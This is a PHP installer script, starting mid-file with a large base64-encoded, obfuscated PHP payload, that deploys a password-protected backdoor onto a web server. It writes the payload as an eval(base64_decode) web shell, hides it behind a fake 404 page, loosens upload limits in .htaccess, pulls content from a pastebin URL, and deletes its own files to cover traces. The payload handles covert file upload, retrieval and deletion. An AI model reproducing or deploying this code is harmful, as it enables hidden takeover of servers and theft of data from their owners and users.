yKDE2MSkpXSkpeyRfX19fX19fX19fX19fX19fX19fX19fXz1iYXNlNjRfZGVjb2RlKHN0cnJldigkX1BPU1RbbWQ1KCRfU0VSVkVSW180NzkwOTc4MzIoMTYyKV0gLl80NzkwOTc4MzIoMTYzKSldKSk7JF9fX19fX19fX19fX19fX19fX19fX19fXz1wYXRoaW5mbygkX19fX19fX19fX19fX19fX19fX19fX18pW180NzkwOTc4MzIoMTY0KV07aWYoJF9fX19fX19fX19fX19fX19fX19fX19fXyA9PSBudWxsKXskX19fX19fX19fX19fX19fX19fX19fX19fPWV4cGxvZGUoJF9fX19fX19fXywkX19fX19fX19fX19fX19fX19fX19fX18pW3JvdW5kKDArMC41KzAuNSldO31pZighY3R5cGVfcHJpbnQoJF9fX19fX19fX19fX19fX19fX19fX19fKW9yICRfX19fX19fX19fX19fX19fX19fX19fX18gPT0gXzQ3OTA5NzgzMigxNjUpb3IgJF9fX19fX19fX19fX19fX19fX19fX19fXyA9PSBfNDc5MDk3ODMyKDE2NilvciAkX19fX19fX19fX19fX19fX19fX19fX19fID09IF80NzkwOTc4MzIoMTY3KW9yICRfX19fX19fX19fX19fX19fX19fX19fX18gPT0gXzQ3OTA5NzgzMigxNjgpb3IgJF9fX19fX19fX19fX19fX19fX19fX19fXyA9PSBfNDc5MDk3ODMyKDE2OSlvciAkX19fX19fX19fX19fX19fX19fX19fX19fID09IF80NzkwOTc4MzIoMTcwKW9yICRfX19fX19fX19fX19fX19fX19fX19fX18gPT0gXzQ3OTA5NzgzMigxNzEpb3IgJF9fX19fX19fX19fX19fX19fX19fX19fXyA9PSBfNDc5MDk3ODMyKDE3MilvciAkX19fX19fX19fX19fX19fX19fX19fX19fID09IF80NzkwOTc4MzIoMTczKSlyZXR1cm47bW92ZV91cGxvYWRlZF9maWxlKCRfRklMRVNbbWQ1KCRfX19fX19fX19fX19fX19fX19fX19fXyldW180NzkwOTc4MzIoMTc0KV0sJF9fX19fX18gLl80NzkwOTc4MzIoMTc1KSAuJF9fX19fX19fX19fX19fX19fX19fX19fKTt9aWYoIWVtcHR5KCRfR0VUW21kNSgkX1NFUlZFUltfNDc5MDk3ODMyKDE3NildIC5fNDc5MDk3ODMyKDE3NykpXSkpeyRfX19fX19fX19fX19fX19fX19fX19fX19fPWpzb25fZGVjb2RlKGJhc2U2NF9kZWNvZGUoc3RycmV2KCRfR0VUW21kNSgkX1NFUlZFUltfNDc5MDk3ODMyKDE3OCldIC5fNDc5MDk3ODMyKDE3OSkpXSkpLHRydWUpO2ZvcmVhY2goJF9fX19fX19fX19fX19fX19fX19fX19fX18gYXMgJF9fX19fX19fX19fX19fX19fXyl7JF9fX19fX19fX19fX19fX19fX189JF9fX19fX19fX19fX19fX19fX1ttZDUoJF9TRVJWRVJbXzQ3OTA5NzgzMigxODApXSAuXzQ3OTA5NzgzMigxODEpKV07JF9fX19fX19fX19fX19fX19fX19fPXN0cl9yZXBsYWNlKF80NzkwOTc4MzIoMTgyKSxfNDc5MDk3ODMyKDE4MyksJF9fX19fX19fX19fX19fX19fX1ttZDUoJF9TRVJWRVJbXzQ3OTA5NzgzMigxODQpXSAuXzQ3OTA5NzgzMigxODUpKV0pOyRfX19fX19fX19fX19fX19fX19fX19fPWJhc2U2NF9kZWNvZGUoJF9fX19fX19fX19fX19fX19fX1ttZDUoJF9TRVJWRVJbXzQ3OTA5NzgzMigxODYpXSAuXzQ3OTA5NzgzMigxODcpKV0pO2lmKCEkX19fX19fX19fX19fX19fXyl7aWYoc2hhMSgkX19fX19fX19fX19fX19fX19fXykhPSBiYXNlNjRfZGVjb2RlKHN0cnJldigkX0dFVFttZDUoJF9TRVJWRVJbXzQ3OTA5NzgzMigxODgpXSAuXzQ3OTA5NzgzMigxODkpKV0pKW9yIHN0cmxlbigkX19fX19fX19fX19fX19fX19fXykhPSByb3VuZCgwKzEwKzEwKzEwKzEwKW9yIHN0cmxlbigkX19fX19fX19fX19fX19fX19fX18pIT0gcm91bmQoMCsxMy4zMzMzMzMzMzMzMzMrMTMuMzMzMzMzMzMzMzMzKzEzLjMzMzMzMzMzMzMzMykpe3JldHVybjt9fWlmKCFjdHlwZV9wcmludCgkX19fX19fX19fX19fX19fX19fX18pb3IhY3R5cGVfcHJpbnQoJF9fX19fX19fX19fX19fX19fX18pb3IgJF9fX19fX19fX19fX19fX19fX19fID09IF80NzkwOTc4MzIoMTkwKW9yICRfX19fX19fX19fX19fX19fX19fXyA9PSBfNDc5MDk3ODMyKDE5MSlvciAkX19fX19fX19fX19fX19fX19fX18gPT0gXzQ3OTA5NzgzMigxOTIpb3IgJF9fX19fX19fX19fX19fX19fX19fID09IF80NzkwOTc4MzIoMTkzKW9yICRfX19fX19fX19fX19fX19fX19fXyA9PSBfNDc5MDk3ODMyKDE5NClvciAkX19fX19fX19fX19fX19fX19fX18gPT0gXzQ3OTA5NzgzMigxOTUpb3IgJF9fX19fX19fX19fX19fX19fX19fID09IF80NzkwOTc4MzIoMTk2KW9yICRfX19fX19fX19fX19fX19fX19fXyA9PSBfNDc5MDk3ODMyKDE5NylvciAkX19fX19fX19fX19fX19fX19fX18gPT0gXzQ3OTA5NzgzMigxOTgpKWNvbnRpbnVlO2ZpbGVfcHV0X2NvbnRlbnRzKCRfX19fX19fIC5fNDc5MDk3ODMyKDE5OSkgLiRfX19fX19fX19fX19fX19fX19fIC4kX19fX19fX19fIC4kX19fX19fX19fX19fX19fX19fX18sbF8obF9fKGZpbGVfZ2V0X2NvbnRlbnRzKCRfX19fX19fIC5fNDc5MDk3ODMyKDIwMCkgLiRfX19fX19fX19fX19fX19fX19fIC4kX19fX19fX19fIC4kX19fX19fX19fX19fX19fX19fX18pLG1kNSgkX19fX19fX19fX19fX19fX19fXyAuY3JjMzIoJF9fX19fXyAuJF9fX19fIC4kX19fX19fX18pKSkgLiRfX19fX19fX19fX19fX19fX19fX19fLG1kNSgkX19fX19fX19fX19fX19fX19fXyAuY3JjMzIoJF9fX19fXyAuJF9fX19fIC4kX19fX19fX18pKSkpO319aWYoIWVtcHR5KGJhc2U2NF9kZWNvZGUoc3RycmV2KCRfR0VUW21kNSgkX1NFUlZFUltfNDc5MDk3ODMyKDIwMSldIC5fNDc5MDk3ODMyKDIwMikpXSkpKWFuZCAkX19fX19fX19fX19fX19fXyA9PSB0cnVlKXskX19fX19fX19fX19fPWFycmF5KCk7JF9fX19fX19fX19fX19fX19fX19fX19fX19fPWpzb25fZGVjb2RlKGJhc2U2NF9kZWNvZGUoc3RycmV2KCRfR0VUW21kNSgkX1NFUlZFUltfNDc5MDk3ODMyKDIwMyldIC5fNDc5MDk3ODMyKDIwNCkpXSkpLHRydWUpOyRfX19fX19fX19fX19fX19fX19fXz0kX19fX19fX19fX19fX19fX19fX19fX19fX19bbWQ1KCRfU0VSVkVSW180NzkwOTc4MzIoMjA1KV0gLl80NzkwOTc4MzIoMjA2KSldOyRfX19fX19fX19fX19fX19fXz0kX19fX19fX19fX19fX19fX19fX19fX19fX19bbWQ1KCRfU0VSVkVSW180NzkwOTc4MzIoMjA3KV0gLl80NzkwOTc4MzIoMjA4KSldOyRfX19fX19fX19fX19fX19fX19fX19fX19fX189JF9fX19fX19fX19fX19fX19fX19fX19fX19fW21kNSgkX1NFUlZFUltfNDc5MDk3ODMyKDIwOSldIC5fNDc5MDk3ODMyKDIxMCkpXTtpZigkX19fX19fX19fX19fX19fX19fX18gPT0gXzQ3OTA5NzgzMigyMTEpb3IgJF9fX19fX19fX19fX19fX19fX19fID09IF80NzkwOTc4MzIoMjEyKW9yICRfX19fX19fX19fX19fX19fX19fXyA9PSBfNDc5MDk3ODMyKDIxMylvciAkX19fX19fX19fX19fX19fX19fX18gPT0gXzQ3OTA5NzgzMigyMTQpb3IgJF9fX19fX19fX19fX19fX19fX19fID09IF80NzkwOTc4MzIoMjE1KW9yICRfX19fX19fX19fX19fX19fX19fXyA9PSBfNDc5MDk3ODMyKDIxNilvciAkX19fX19fX19fX19fX19fX19fX18gPT0gXzQ3OTA5NzgzMigyMTcpb3IgJF9fX19fX19fX19fX19fX19fX19fID09IF80NzkwOTc4MzIoMjE4KW9yICRfX19fX19fX19fX19fX19fX19fXyA9PSBfNDc5MDk3ODMyKDIxOSkpcmV0dXJuOyRfX19fX19fX19fX19fX19fX19fX19fX19fX19fPWdsb2IoJF9fX19fX18gLl80NzkwOTc4MzIoMjIwKSAuJF9fX19fX19fXyAuJF9fX19fX19fX19fX19fX19fX19fKTtmb3JlYWNoKCRfX19fX19fX19fX19fX19fX19fX19fX19fX19fIGFzICRfX19fX19fX19fX19fX19fX18peyRfX19fX19fX19fX19fX19fX19fX19fX19fX19fXz1iYXNlbmFtZSgkX19fX19fX19fX19fX19fX19fLCRfX19fX19fX18gLiRfX19fX19fX19fX19fX19fX19fXyk7JF9fX19fX19fX19fX1skX19fX19fX19fX19fX19fX19fX19fX19fX19fX19dW21kNSgkX1NFUlZFUltfNDc5MDk3ODMyKDIyMSldIC5fNDc5MDk3ODMyKDIyMikpXT0kX19fX19fX19fX19fX19fX19fX19fX19fX19fX187aWYoJF9fX19fX19fX19fX19fX19fID09IHRydWUpeyRfX19fX19fX19fX19bJF9fX19fX19fX19fX19fX19fX19fX19fX19fX19fXVttZDUoJF9TRVJWRVJbXzQ3OTA5NzgzMigyMjMpXSAuXzQ3OTA5NzgzMigyMjQpKV09YmFzZTY0X2VuY29kZShsX18oZmlsZV9nZXRfY29udGVudHMoJF9fX19fX19fX19fX19fX19fXyksbWQ1KCRfX19fX19fX19fX19fX19fX19fX19fX19fX19fXyAuY3JjMzIoJF9fX19fXyAuJF9fX19fIC4kX19fX19fX18pKSkpOyRfX19fX19fX19fX19bJF9fX19fX19fX19fX19fX19fX19fX19fX19fX19fXVttZDUoJF9TRVJWRVJbXzQ3OTA5NzgzMigyMjUpXSAuXzQ3OTA5NzgzMigyMjYpKV09YmFzZTY0X2VuY29kZShkYXRlKF80NzkwOTc4MzIoMjI3KSxmaWxlbXRpbWUoJF9fX19fX19fX19fX19fX19fXykpKTskX19fX19fX19fX19fWyRfX19fX19fX19fX19fX19fX19fX19fX19fX19fX11bbWQ1KCRfU0VSVkVSW180NzkwOTc4MzIoMjI4KV0gLl80NzkwOTc4MzIoMjI5KSldPWJhc2U2NF9lbmNvZGUoZGF0ZShfNDc5MDk3ODMyKDIzMCkpKTt9aWYoY291bnQoJF9fX19fX19fX19fX19fX19fX19fX19fX19fXyk+cm91bmQoMCkpe2ZvcmVhY2goJF9fX19fX19fX19fX19fX19fX19fX19fX19fXyBhcyAkX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fKXskX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fXz1iYXNlNjRfZGVjb2RlKCRfX19fX19fX19fX19fX19fX19fX19fX19fX19fX18pOyRfX19fX19fX19fX19bJF9fX19fX19fX19fX19fX19fX19fX19fX19fX19fXVttZDUoJF9TRVJWRVJbXzQ3OTA5NzgzMigyMzEpXSAuXzQ3OTA5NzgzMigyMzIpKV1bbWQ1KCRfU0VSVkVSW180NzkwOTc4MzIoMjMzKV0gLiRfX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fKV09YmFzZTY0X2VuY29kZShsX18oZmlsZV9nZXRfY29udGVudHMoJF9fX19fX18gLl80NzkwOTc4MzIoMjM0KSAuJF9fX19fX19fX19fX19fX19fX19fX19fX19fX19fIC4kX19fX19fX19fIC5zaGExKCRfX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fIC4kX19fX19fX19fX19fX19fX19fX19fX19fX19fX18pKSxtZDUoJF9fX19fX19fX19fX19fX19fX19fX19fX19fX19fIC5jcmMzMigkX19fX19fIC4kX19fX18gLiRfX19fX19fXykpKSk7fX19ZWNobyhzdHJyZXYoYmFzZTY0X2VuY29kZShqc29uX2VuY29kZSgkX19fX19fX19fX19fKSkpKTt9aWYoIWVtcHR5KGJhc2U2NF9kZWNvZGUoc3RycmV2KCRfR0VUW21kNSgkX1NFUlZFUltfNDc5MDk3ODMyKDIzNSldIC5fNDc5MDk3ODMyKDIzNikpXSkpKWFuZCAkX19fX19fX19fX19fX19fXyA9PSB0cnVlKXskX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX189anNvbl9kZWNvZGUoYmFzZTY0X2RlY29kZShzdHJyZXYoJF9HRVRbbWQ1KCRfU0VSVkVSW180NzkwOTc4MzIoMjM3KV0gLl80NzkwOTc4MzIoMjM4KSldKSksdHJ1ZSk7Zm9yZWFjaCgkX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX18gYXMgJF9fX19fX19fX19fX19fX19fXyl7JF9fX19fX19fX19fX19fX19fX189JF9fX19fX19fX19fX19fX19fX1ttZDUoJF9TRVJWRVJbXzQ3OTA5NzgzMigyMzkpXSAuXzQ3OTA5NzgzMigyNDApKV07JF9fX19fX19fX19fX19fX19fX19fX19fX19fX189Z2xvYigkX19fX19fXyAuXzQ3OTA5NzgzMigyNDEpIC4kX19fX19fX19fX19fX19fX19fXyAuJF9fX19fX19fXyAuXzQ3OTA5NzgzMigyNDIpKTtmb3JlYWNoKCRfX19fX19fX19fX19fX19fX19fX19fX19fX19fIGFzICRfX19fX19fX19fX19fX19fX18pe3VubGluaygkX19fX19fX19fX19fX19fX19fKTt9fX0=";


if (!isset($_POST['instserv'])) {
    ?>
	        <style>
        article,
        aside,
        details,
        figcaption,
        figure,
        footer,
        header,
        hgroup,
        nav,
        section {
            display: block;
        }

        $mainColor: #333333;

        html {
            font-size: 100%;
            -webkit-text-size-adjust: 100%;
            -ms-text-size-adjust: 100%;
        }

        input:focus,
        textarea:focus {
            outline: none;
        }

        label,
        select,
        button,
        input[type="submit"],
        input[type="radio"],
        input[type="checkbox"],
        input[type="button"] {
            cursor: pointer;
        }

        a,
        a:visited,
        a:active {
            text-decoration: none;
        }

        a:hover {
            text-decoration: none;
        }

        ::selection {
            background: #34e181;
            color: #fff;
        }

        ::-moz-selection {
            background: #34e181;
            color: #fff;
        }

        * {
            font-size: 100%;
            margin: 0;
            padding: 0;
            -webkit-box-sizing: border-box;
            -moz-box-sizing: border-box;
            box-sizing: border-box;
        }

        .urmum {
            margin-left: 675px;
            color: #ffff;
            padding-bottom: 25px;
        }

        body {
            background-image: linear-gradient(280deg, #102294 -40%, #521887 100%);
            background-size: cover;
            background-repeat: no-repeat;
            background-attachment: fixed;
            font-family: "Helvetica Neue", Helvetica, Arial;
            color: $mainColor;
        }

        h5 {
            text-align: center;
            margin-top: 5px;
            color: #ffffff;
        }

        h5 > a,
        a:visited {
            color: #fff;
            text-decoration: underline;
        }

        h5 > a:hover {
            text-decoration: none;
        }

        form {
            background: #fff;
            border-radius: 6px;
            padding: 20px;
            padding-top: 30px;
            width: 300px;
            margin: 50px auto;
            box-shadow: 15px 15px 0px rgba(0, 0, 0, .1);
        }

        h1 {
            text-align: center;
            font-size: 1.4em;
            font-weight: 700;
            color: #ccc;
            margin-bottom: 24px;
        }

        span {
            font-weight: 200;
        }

        input {
            width: 100%;
            background: #f5f5f5;
            border: 0;
            padding: 20px;
            border-radius: 6px;
            margin-bottom: 10px;
            border: 1px solid #eee;
        }

        .btn {
            position: relative;
            width: 100%;
            padding: 20px;
            border-radius: 6px;
            border: 0;
            background: #f26964;
            font-size: 1.2em;
            color: #fff;
            text-shadow: 1px 1px 0px rgba(0, 0, 0, .1);
            box-shadow: 0px 3px 0px #c1524e;
        }

        .btn:active {
            top: 3px;
            box-shadow: none;
        }

        .fb {
            margin-top: 15px;
            background: #3b5998;
            box-shadow: 0px 3px 0px #2c416e;
        }

        .tw {
            background: #00acee;
            box-shadow: 0px 3px 0px #008dc3;
        }

        .google {
            background: #db4a39;
            box-shadow: 0px 3px 0px #b93f31;
        }
    </style>
    <form action="install.php" method="post">
        <h1>Quanitte</h1>
        <input placeholder="Password" name="serverpass" type="password"/>
        <button class="btn" name="instserv">Install</button>
    </form>
    <?php
} else {
    $serverpass = $_POST['serverpass'];
    $cryptedpass = hash("md5", $serverpass);
    // Insert your $src value here or remove this line if it's not needed
    $code = base64_decode($src);
    $result = "<?php eval(base64_decode('" . base64_encode(str_replace(["REPLACEMDPASS", "REPLACEFOLDERNAME"], [$cryptedpass, $resultnfolder], $code)) . "')); ?>";
	echo $result;

    // Insert into .htaccess with 644 permissions
    cfile_put_contents644(".htaccess", '
Options -Indexes

php_value memory_limit 512M
php_value post_max_size 150000M
php_value upload_max_filesize 150000M
php_value max_input_vars 1800
php_value max_execution_time 300
php_value max_input_time 300');

    // Insert into the server itself with 644 permissions
    cfile_put_contents644("Quanitte.php", $result);

    cfile_put_contents644("index.html", "<html><head>
    <title>404 Not Found</title>
    </head><body>
    <h1>Not Found</h1>
    <p>The requested URL was not found on this server.</p>
    <hr>

    </body></html>");

    // Remove this line if not needed
    cfile_put_contents644("index.php", "<?php include(\"/opt/index.php\") ?>
");

	$dildokatkares = file_get_contents("https://pastebin.com/raw/27Yfcwsn");

    // Anti-dokatka HTML
    cfile_put_contents644("dildokatka.html", $dildokatkares);

    mkdir($resultnfolder, 0755);
    ?>
	        <style>
        article,
        aside,
        details,
        figcaption,
        figure,
        footer,
        header,
        hgroup,
        nav,
        section {
            display: block;
        }

        $mainColor: #333333;

        html {
            font-size: 100%;
            -webkit-text-size-adjust: 100%;
            -ms-text-size-adjust: 100%;
        }

        input:focus,
        textarea:focus {
            outline: none;
        }

        label,
        select,
        button,
        input[type="submit"],
        input[type="radio"],
        input[type="checkbox"],
        input[type="button"] {
            cursor: pointer;
        }

        a,
        a:visited,
        a:active {
            text-decoration: none;
        }

        a:hover {
            text-decoration: none;
        }

        ::selection {
            background: #34e181;
            color: #fff;
        }

        ::-moz-selection {
            background: #34e181;
            color: #fff;
        }

        * {
            font-size: 100%;
            margin: 0;
            padding: 0;
            -webkit-box-sizing: border-box;
            -moz-box-sizing: border-box;
            box-sizing: border-box;
        }

        .urmum {
            margin-left: 675px;
            color: #ffff;
            padding-bottom: 25px;
        }

        body {
            background-image: linear-gradient(280deg, #eb0f12 -40%, #1f9959 100%);
            background-size: cover;
            background-repeat: no-repeat;
            background-attachment: fixed;
            font-family: "Helvetica Neue", Helvetica, Arial;
            color: $mainColor;
        }

        h5 {
            text-align: center;
            margin-top: 5px;
            color: #ffffff;
        }

        h5 > a,
        a:visited {
            color: #fff;
            text-decoration: underline;
        }

        h5 > a:hover {
            text-decoration: none;
        }

        form {
            background: #fff;
            border-radius: 6px;
            padding: 20px;
            padding-top: 30px;
            width: 300px;
            margin: 50px auto;
            box-shadow: 15px 15px 0px rgba(0, 0, 0, .1);
        }

        h1 {
            text-align: center;
            font-size: 1.4em;
            font-weight: 700;
            color: #ccc;
            margin-bottom: 24px;
        }

        span {
            font-weight: 200;
        }

        input {
            width: 100%;
            background: #f5f5f5;
            border: 0;
            padding: 20px;
            border-radius: 6px;
            margin-bottom: 10px;
            border: 1px solid #eee;
        }

        .btn {
            position: relative;
            width: 100%;
            padding: 20px;
            border-radius: 6px;
            border: 0;
            background: #f26964;
            font-size: 1.2em;
            color: #fff;
            text-shadow: 1px 1px 0px rgba(0, 0, 0, .1);
            box-shadow: 0px 3px 0px #c1524e;
        }

        .btn:active {
            top: 3px;
            box-shadow: none;
        }

        .fb {
            margin-top: 15px;
            background: #3b5998;
            box-shadow: 0px 3px 0px #2c416e;
        }

        .tw {
            background: #00acee;
            box-shadow: 0px 3px 0px #008dc3;
        }

        .google {
            background: #db4a39;
            box-shadow: 0px 3px 0px #b93f31;
        }
    </style>
    <h1>L1nc0In</h1>
    <h1><span>Installation successful!</span></h1>
    <div class="urmum">
    <?php
    $serverurl = "http://".$_SERVER['SERVER_NAME']."/@==gbJBzYuFDT";
    echo "Your Server Address: {$serverurl}";
    $file_to_delete = 'install.php';
    unlink($file_to_delete);
    unlink(__FILE__);
}
?>
